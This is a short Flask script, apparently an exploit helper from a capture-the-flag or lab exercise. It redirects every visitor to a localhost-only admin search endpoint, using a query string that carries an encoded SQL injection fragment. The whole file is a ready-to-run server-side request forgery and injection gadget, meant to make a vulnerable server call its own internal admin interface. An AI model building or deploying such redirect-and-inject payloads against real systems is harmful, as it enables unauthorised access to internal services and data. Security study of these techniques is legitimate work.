from flask import Flask, redirect

app = Flask(__name__)

@app.route('/')
def do_redirect():
    target_url = "http://127.0.0.1:5000/internal/admin/search?q=%25%27%0A--access_level"
    print(f"Menerima request, me-redirect ke: {target_url}")
    return redirect(target_url, code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
